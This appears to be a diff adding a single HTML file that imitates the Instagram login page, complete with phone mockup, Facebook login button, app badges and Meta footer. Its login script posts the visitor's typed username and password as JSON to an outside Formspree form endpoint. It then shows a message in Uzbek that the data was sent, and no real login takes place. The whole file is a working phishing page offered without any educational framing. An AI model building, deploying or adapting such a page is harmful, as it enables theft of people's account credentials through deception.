@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      color: #262626;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ── MAIN WRAPPER ── */
+    .main {
+      display: flex;
+      align-items: center;
+      gap: 32px;
+      width: 100%;
+      max-width: 935px;
+      padding: 0 20px;
+    }
+
+    /* ── LEFT PHONE MOCKUP ── */
+    .phone-wrap {
+      flex: 0 0 380px;
+      position: relative;
+      height: 580px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .phone-bg {
+      position: relative;
+      width: 239px;
+      height: 420px;
+    }
+
+    /* Phone frame */
+    .phone-frame {
+      width: 239px;
+      height: 420px;
+      border: 3px solid #dbdbdb;
+      border-radius: 36px;
+      background: #fff;
+      overflow: hidden;
+      position: absolute;
+      top: 0; left: 0;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.12);
+      z-index: 2;
+    }
+
+    /* Sliding screenshots inside phone */
+    .phone-slider {
+      display: flex;
+      width: 300%;
+      height: 100%;
+      transition: transform 1s ease-in-out;
+    }
+
+    .phone-slide {
+      width: calc(100% / 3);
+      height: 100%;
+      flex-shrink: 0;
+      background: #fafafa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      overflow: hidden;
+    }
+
+    /* Fake screenshot content */
+    .slide-inner {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .slide-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 12px;
+      border-bottom: 1px solid #dbdbdb;
+      background: #fff;
+    }
+
+    .slide-header-logo {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 18px;
+      color: #262626;
+    }
+
+    .slide-posts {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 2px;
+      flex: 1;
+    }
+
+    .slide-post {
+      aspect-ratio: 1;
+      background: #efefef;
+    }
+
+    .slide-post:nth-child(1) { background: linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); }
+    .slide-post:nth-child(2) { background: linear-gradient(135deg,#4facfe,#00f2fe); }
+    .slide-post:nth-child(3) { background: linear-gradient(135deg,#a18cd1,#fbc2eb); }
+    .slide-post:nth-child(4) { background: linear-gradient(135deg,#ffecd2,#fcb69f); }
+    .slide-post:nth-child(5) { background: linear-gradient(135deg,#a1c4fd,#c2e9fb); }
+    .slide-post:nth-child(6) { background: linear-gradient(135deg,#d4fc79,#96e6a1); }
+    .slide-post:nth-child(7) { background: linear-gradient(135deg,#f093fb,#f5576c); }
+    .slide-post:nth-child(8) { background: linear-gradient(135deg,#4facfe,#00f2fe); }
+    .slide-post:nth-child(9) { background: linear-gradient(135deg,#43e97b,#38f9d7); }
+
+    /* story row */
+    .slide-stories {
+      display: flex;
+      gap: 10px;
+      padding: 10px 12px;
+      overflow: hidden;
+      background: #fff;
+      border-bottom: 1px solid #dbdbdb;
+    }
+
+    .story-bubble {
+      flex-shrink: 0;
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      padding: 2px;
+      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    }
+
+    .story-inner {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: #efefef;
+      border: 2px solid #fff;
+    }
+
+    .story-inner:nth-child(1) { background: linear-gradient(135deg,#f09433,#dc2743); }
+
+    /* ── RIGHT: LOGIN PANEL ── */
+    .right {
+      flex: 0 0 350px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .card, .card2 {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      width: 100%;
+    }
+
+    .card {
+      padding: 40px 40px 24px;
+    }
+
+    .card2 {
+      padding: 20px;
+      text-align: center;
+    }
+
+    /* LOGO */
+    .ig-logo {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .ig-logo span {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 56px;
+      color: #262626;
+      line-height: 1;
+      display: block;
+    }
+
+    /* INPUTS */
+    .input-wrap {
+      margin-bottom: 6px;
+      position: relative;
+    }
+
+    .input-wrap input {
+      width: 100%;
+      height: 38px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 0 8px;
+      font-size: 12px;
+      color: #262626;
+      outline: none;
+      transition: border-color .1s;
+    }
+
+    .input-wrap input:focus {
+      border-color: #a8a8a8;
+      background: #fff;
+    }
+
+    .input-wrap input::placeholder {
+      color: #8e8e8e;
+    }
+
+    /* floating label effect */
+    .input-wrap.has-label { position: relative; }
+
+    .input-wrap.has-label input {
+      padding: 14px 8px 2px;
+      height: 38px;
+    }
+
+    .input-wrap.has-label label {
+      position: absolute;
+      top: 50%;
+      left: 9px;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: #8e8e8e;
+      pointer-events: none;
+      transition: all .1s;
+    }
+
+    .input-wrap.has-label input:focus + label,
+    .input-wrap.has-label input:not(:placeholder-shown) + label {
+      top: 7px;
+      transform: none;
+      font-size: 10px;
+    }
+
+    /* show/hide password */
+    .pw-wrap { position: relative; }
+    .pw-wrap input { padding-right: 48px; }
+    .pw-toggle {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px;
+      font-weight: 600;
+      color: #262626;
+      cursor: pointer;
+      background: none;
+      border: none;
+      user-select: none;
+    }
+
+    /* LOG IN BUTTON */
+    .btn-login {
+      width: 100%;
+      height: 32px;
+      margin-top: 8px;
+      background: #0095f6;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background .1s;
+    }
+
+    .btn-login:hover { background: #1877f2; }
+    .btn-login:active { background: #0074c1; }
+    .btn-login:disabled { background: #b2dffc; cursor: default; }
+
+    /* DIVIDER */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 18px 0;
+      gap: 18px;
+    }
+
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .divider span {
+      font-size: 13px;
+      font-weight: 600;
+      color: #8e8e8e;
+      letter-spacing: 1.2px;
+    }
+
+    /* FACEBOOK */
+    .fb-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      width: 100%;
+      padding: 4px 0;
+    }
+
+    .fb-btn:hover { color: #1877f2; }
+    .fb-btn:hover svg { fill: #1877f2; }
+
+    .fb-btn svg {
+      width: 18px; height: 18px;
+      fill: #385185;
+      transition: fill .1s;
+    }
+
+    /* FORGOT */
+    .forgot {
+      text-align: center;
+      margin-top: 16px;
+    }
+
+    .forgot a {
+      font-size: 12px;
+      color: #385185;
+      text-decoration: none;
+    }
+
+    .forgot a:hover { color: #385185; text-decoration: underline; }
+
+    /* SIGNUP CARD */
+    .card2 p { font-size: 14px; }
+    .card2 a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    /* APP DOWNLOAD */
+    .get-app {
+      text-align: center;
+      margin-top: 4px;
+    }
+
+    .get-app p {
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    .badges {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: #3d3d3d;
+      color: #fff;
+      border-radius: 6px;
+      padding: 5px 12px;
+      font-size: 11px;
+      text-decoration: none;
+      border: 1px solid #555;
+      cursor: pointer;
+    }
+
+    .badge svg { width: 16px; height: 16px; fill: #fff; }
+
+    .badge small { display: block; font-size: 8px; color: #ccc; }
+    .badge strong { font-size: 13px; }
+
+    /* FOOTER */
+    footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      padding-bottom: 32px;
+    }
+
+    footer .flinks {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 4px 10px;
+      margin-bottom: 12px;
+    }
+
+    footer .flinks a {
+      color: #8e8e8e;
+      text-decoration: none;
+      font-size: 12px;
+    }
+
+    footer .flinks a:hover { text-decoration: underline; }
+
+    /* hide phone on small screen */
+    @media (max-width: 700px) {
+      .phone-wrap { display: none; }
+      .main { justify-content: center; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="main">
+
+  <!-- ── LEFT: PHONE MOCKUP ── -->
+  <div class="phone-wrap">
+    <div class="phone-bg">
+      <div class="phone-frame">
+        <div class="slide-inner">
+          <div class="slide-header">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="1.5"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/></svg>
+            <span class="slide-header-logo">Instagram</span>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="1.5"><path d="M22 16.92V21a1 1 0 01-1.09 1A19.91 19.91 0 013 4.09 1 1 0 014 3h4.09a1 1 0 011 .75 12.25 12.25 0 00.57 2.57 1 1 0 01-.22 1L7.91 8.85a16 16 0 006.29 6.29l1.53-1.53a1 1 0 011-.22 12.25 12.25 0 002.57.57 1 1 0 01.75 1z"/></svg>
+          </div>
+          <div class="slide-stories">
+            <div class="story-bubble"><div class="story-inner"></div></div>
+            <div class="story-bubble"><div class="story-inner" style="background:linear-gradient(135deg,#4facfe,#00f2fe)"></div></div>
+            <div class="story-bubble"><div class="story-inner" style="background:linear-gradient(135deg,#a18cd1,#fbc2eb)"></div></div>
+            <div class="story-bubble"><div class="story-inner" style="background:linear-gradient(135deg,#43e97b,#38f9d7)"></div></div>
+          </div>
+          <div class="slide-posts">
+            <div class="slide-post"></div>
+            <div class="slide-post"></div>
+            <div class="slide-post"></div>
+            <div class="slide-post"></div>
+            <div class="slide-post"></div>
+            <div class="slide-post"></div>
+            <div class="slide-post"></div>
+            <div class="slide-post"></div>
+            <div class="slide-post"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── RIGHT: LOGIN ── -->
+  <div class="right">
+
+    <div class="card">
+      <!-- Logo -->
+      <div class="ig-logo">
+        <span>Instagram</span>
+      </div>
+
+      <!-- Inputs -->
+      <div class="input-wrap">
+        <input type="text" placeholder="Phone number, username, or email" id="uname" name="username" autocomplete="username"/>
+      </div>
+
+      <div class="input-wrap pw-wrap">
+        <input type="password" placeholder="Password" id="pw" name="password" autocomplete="current-password"/>
+        <button class="pw-toggle" onclick="togglePw()" id="pwBtn" type="button">Show</button>
+      </div>
+
+      <button class="btn-login" id="loginBtn" onclick="handleLogin()" type="button">Log in</button>
+
+      <!-- Success message (hidden by default) -->
+      <div id="successMsg" style="display:none;margin-top:12px;text-align:center;font-size:13px;color:#00a400;">
+        ✓ Ma'lumotlar yuborildi!
+      </div>
+
+      <!-- OR divider -->
+      <div class="divider"><span>OR</span></div>
+
+      <!-- Facebook -->
+      <button class="fb-btn">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M24 12.073C24 5.446 18.627 0 12 0S0 5.446 0 12.073c0 6.03 4.388 11.026 10.125 11.927v-8.437H7.078v-3.49h3.047V9.43c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.874v2.25h3.328l-.532 3.49h-2.796v8.437C19.612 23.099 24 18.104 24 12.073z"/>
+        </svg>
+        Log in with Facebook
+      </button>
+
+      <div class="forgot">
+        <a href="#">Forgot password?</a>
+      </div>
+    </div>
+
+    <div class="card2">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <div class="get-app">
+      <p>Get the app.</p>
+      <div class="badges">
+        <a class="badge" href="#">
+          <svg viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98l-.09.06c-.22.14-2.18 1.27-2.16 3.8.03 3.02 2.65 4.03 2.68 4.04l-.07.28zM13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+          <div><small>Download on the</small><strong>App Store</strong></div>
+        </a>
+        <a class="badge" href="#">
+          <svg viewBox="0 0 24 24"><path d="M3.609 1.814L13.792 12 3.61 22.186a.996.996 0 01-.61-.92V2.734a1 1 0 01.609-.92zm10.89 10.893l2.302 2.302-10.937 6.333 8.635-8.635zm3.199-3.199c.589.34.752.933.752 1.492s-.163 1.152-.752 1.492L15.396 13.8l-2.485-2.485L15.396 8.83l2.302-1.322zM5.864 2.658L16.8 8.99l-2.302 2.302-8.635-8.634z"/></svg>
+          <div><small>Get it on</small><strong>Google Play</strong></div>
+        </a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="flinks">
+    <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
+    <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
+    <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
+    <a href="#">Contact uploading and non-users</a><a href="#">Meta Verified</a>
+  </div>
+  <p>English &copy; 2025 Instagram from Meta</p>
+</footer>
+
+<script>
+  // Show/hide password
+  function togglePw() {
+    const pw = document.getElementById('pw');
+    const btn = document.getElementById('pwBtn');
+    if (pw.type === 'password') {
+      pw.type = 'text';
+      btn.textContent = 'Hide';
+    } else {
+      pw.type = 'password';
+      btn.textContent = 'Show';
+    }
+  }
+
+  // Submit to Formspree
+  async function handleLogin() {
+    const uname = document.getElementById('uname').value.trim();
+    const pw    = document.getElementById('pw').value.trim();
+    if (!uname || !pw) return;
+
+    const loginBtn = document.getElementById('loginBtn');
+    loginBtn.disabled = true;
+    loginBtn.textContent = 'Logging in...';
+
+    try {
+      const res = await fetch('https://formspree.io/f/xjgqrblw', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({ username: uname, password: pw })
+      });
+
+      if (res.ok) {
+        document.getElementById('successMsg').style.display = 'block';
+        loginBtn.textContent = 'Log in';
+        document.getElementById('uname').value = '';
+        document.getElementById('pw').value = '';
+        updateBtn();
+      } else {
+        loginBtn.textContent = 'Log in';
+        loginBtn.disabled = false;
+      }
+    } catch(e) {
+      loginBtn.textContent = 'Log in';
+      loginBtn.disabled = false;
+    }
+  }
+
+  // Enable button only when both fields filled
+  const unameEl = document.getElementById('uname');
+  const pwEl    = document.getElementById('pw');
+  const btnEl   = document.getElementById('loginBtn');
+
+  function updateBtn() {
+    btnEl.disabled = !(unameEl.value.trim() && pwEl.value.trim());
+  }
+
+  unameEl.addEventListener('input', updateBtn);
+  pwEl.addEventListener('input', updateBtn);
+
+  // Also submit on Enter key
+  [unameEl, pwEl].forEach(el => {
+    el.addEventListener('keydown', e => { if (e.key === 'Enter') handleLogin(); });
+  });
+
+  updateBtn();
+</script>
+
+</body>
+</html>
